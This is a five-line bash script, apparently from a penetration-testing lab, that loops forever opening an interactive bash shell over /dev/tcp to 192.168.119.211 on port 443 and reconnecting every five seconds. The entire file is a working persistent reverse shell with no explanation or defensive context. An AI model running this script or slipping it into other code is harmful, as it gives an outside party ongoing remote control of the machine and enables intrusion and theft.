#!/bin/bash
while [ 0 -eq 0 ]; do
	/bin/bash -i >& /dev/tcp/192.168.119.211/443 0>&1
	sleep 5
done
